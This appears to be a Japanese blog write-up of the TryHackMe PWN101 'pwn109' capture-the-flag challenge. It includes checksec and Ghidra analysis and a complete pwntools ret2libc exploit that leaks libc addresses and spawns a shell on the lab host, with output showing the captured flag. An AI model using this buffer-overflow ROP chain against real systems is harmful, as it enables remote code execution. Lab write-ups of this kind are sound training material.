---
title: TryHackMe PWN101 Writeup (9) PWN109
pubDatetime: 2026-04-25T09:00:00+09:00
description: TryHackMe PWN101 Challenge 9のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

```shellsession
$ file pwn109-1644300507645.pwn109
pwn109-1644300507645.pwn109: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7a64987fd8eb1e96bd9178b4453cd80e78cbe0bb, for GNU/Linux 3.2.0, not stripped
```

## checksec

PIEじゃない。Canaryもない。

```shellsession
$ .venv/bin/pwn checksec pwn109-1644300507645.pwn109
[*] '/home/hat0uma/work/pwn109-1644300507645.pwn109'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

SHSTKもIBTも知らなかったけど、
SHSTKがあったら、returnアドレス書き換えがほぼできなくなり、
IBTがあったら、`ENDBR`にしか飛べなくなるから、ROPガジェットとかで使う、`pop rdi;ret`みたいな命令文に飛ぶとかができなくなる。らしい。

```
SHSTK:
戻りアドレスだけを保存する専用の「影のスタック（Shadow Stack）」をメモリ上に用意します。
関数を呼ぶ際、戻りアドレスを両方のスタックに積み、戻る時に両者を比較します。
Shadow Stack領域はハードウェアによって「通常の書き込み不可」として保護されているため、バッファオーバーフローで値を書き換えることが物理的に不可能です。

IBT:
攻撃者が関数ポインタを書き換えて、プログラムの実行フローを「意図しない場所（ライブラリ内の危険な関数や、ROPガジェットの途中など）」へ飛ばす攻撃を防ぎます。
  1. 目印の設置: コンパイル時、関数の入り口など「ジャンプしても良い場所」に ENDBR32/64（End Branch）という特殊な命令を配置します。
  2. ハードウェアによる監視: CPUが CALL や JMP 命令を実行した直後、移動先の命令が ENDBR であるかどうかをチェックします。
  3. 不正検知: もしジャンプ先が ENDBR でなかった場合、CPUは「不正な制御フロー」と判断して例外（#CP）を発生させ、プログラムを停止させます。
```

## 実行

なんかガジェット使えないよとか、cat flag.txtできないよって言ってる。

```shellsession
./pwn109-1644300507645.pwn109
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 109

This time no 🗑️ 🤫 & 🐈🚩.📄 Go ahead 😏
a
```

## Ghidra

```c
void main(void)

{
  char local_28 [32];

  setup();
  banner();
  puts(&DAT_00402120);
  gets(local_28);
  return;
}
```

## solver

SHSTKがシステムで本当に有効だったらダメだと思うけどとりあえずROP組んでみる。

### ガジェット探し

```shellsession
$ .venv/bin/ROPgadget --binary pwn109-1644300507645.pwn109 | grep "pop rdi"
0x00000000004012a3 : pop rdi ; ret
```

### solver

```python
import pwn
from pwn import log


bin = "./pwn109-1644300507645.pwn109"
elf = pwn.ELF(bin)
pwn.context.binary = elf
# p = pwn.process(bin)
p = pwn.remote("10.145.190.63", 9009)

p.recvuntil("Go ahead 😏\n".encode())

main_addr = 0x4011F2.to_bytes(8, "little")
ret = 0x401231.to_bytes(8, "little")
pop_rdi_ret = 0x00000000004012A3.to_bytes(8, "little")
got = {
    "puts": 0x404018.to_bytes(8, "little"),
    "gets": 0x404020.to_bytes(8, "little"),
}
plt = {
    "puts": 0x401060.to_bytes(8, "little"),
    "gets": 0x404070.to_bytes(8, "little"),
}


payload = b""
payload += b"1" * 32  # バッファを埋める
payload += b"2" * 8  # saved_rbp
payload += pop_rdi_ret
payload += got["puts"]
payload += plt["puts"]
payload += pop_rdi_ret
payload += got["gets"]
payload += plt["puts"]
payload += main_addr
payload += b"\n"

with open("input.bin", "wb") as f:
    f.write(payload)

log.info(payload)
p.send(payload)

b = p.recv(7)
print(b)
libc_puts = int.from_bytes(b[:6], "little")
print(f"libc_puts = 0x{libc_puts:x}")

b = p.recv(7)
print(b)
libc_gets = int.from_bytes(b[:6], "little")
print(f"libc_gets = 0x{libc_gets:x}")

# ↑の実行結果が以下になった。
# libc_puts = 0x7fe88da87be0
# libc_gets = 0x7fe88da87080
# > https://libc.rip/ で検索したオフセットからベースアドレス計算+`system`と``/bin/sh``のアドレスを計算。
libc_base = libc_puts - 0x84420
libc_system = libc_base + 0x52290
libc_bin_sh = libc_base + 0x1B45BD
print(
    f"libc_base = 0x{libc_base:x}, libc_system = 0x{libc_system:x} libc_bin_sh = 0x{libc_bin_sh:x}"
)

payload2 = b""
payload2 += b"1" * 32  # バッファを埋める
payload2 += b"2" * 8  # saved_rbp
payload2 += pop_rdi_ret
payload2 += libc_bin_sh.to_bytes(8, "little")  # /bin/shのアドレス
# payload2 += plt["puts"]
# payload2 += ret
payload2 += libc_system.to_bytes(8, "little")
payload2 += b"\n"

with open("input2.bin", "wb") as f:
    f.write(payload2)

log.info(payload2)
p.send(payload2)
# print(p.recvall().decode())
p.interactive()
```

### 実行結果

```shellsession
$ python solver-pwn109.py
[*] '/home/hat0uma/work/pwn109-1644300507645.pwn109'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 10.145.190.63 on port 9009: Done
/home/hat0uma/work/.venv/lib/python3.12/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1,
no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] 1111111111111111111111111111111122222222£\x12@\x00\x00\x00\x00\x00\x18@@\x00\x00\x00\x00\x00`\x10@\x00\x00\x00\x00\x00£\x12
@\x00\x00\x00\x00\x00 @@\x00\x00\x00\x00\x00`\x10@\x00\x00\x00\x00\x00ò\x11@\x00\x00\x00\x00\x00
b' \xb4\xeb!\x07\x7f\n'
libc_puts = 0x7f0721ebb420
b'p\xa9\xeb!\x07\x7f\n'
libc_gets = 0x7f0721eba970
libc_base = 0x7f0721e37000, libc_system = 0x7f0721e89290 libc_bin_sh = 0x7f0721feb5bd
[*] 1111111111111111111111111111111122222222£\x12@\x00\x00\x00\x00\x00½µþ!\x07\x7f\x00\x00  è!\x07\x7f\x00\x00
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 109

This time no 🗑️ 🤫 & 🐈🚩.📄 Go ahead 😏
$ ls
flag.txt
pwn109
pwn109.c
$ cat flag.txt
THM{w417_h0w_Y0u_l3ked_i7_w1th0uT_pr1ntF??}
$
[*] Interrupted
[*] Closed connection to 10.145.190.63 port 9009
```
